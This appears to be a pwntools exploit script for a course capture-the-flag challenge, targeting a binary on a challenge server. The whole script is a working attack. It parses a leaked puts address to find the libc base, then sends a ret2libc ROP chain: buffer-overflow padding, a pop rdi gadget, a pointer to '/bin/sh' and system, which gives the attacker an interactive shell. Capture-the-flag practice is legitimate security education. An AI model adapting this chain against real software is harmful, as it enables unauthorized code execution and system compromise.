from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

libc = ELF('libc.so.6')

gs = '''
break vuln
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-bin2.chals.io", 443, ssl=True, sni="cse4850-bin2.chals.io")
    return process(e.path)

p = start()
p.recvuntil(b"puts: 0x")
puts_addr = int(p.recv(12), 16)
log.info(f"Got leaked puts address: {hex(puts_addr)}")
libc.address = puts_addr - libc.sym['puts']

r = ROP(libc)
payload = cyclic(72)
payload += p64(r.find_gadget(['ret'])[0])
payload += p64(r.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'>>>', payload)

p.interactive()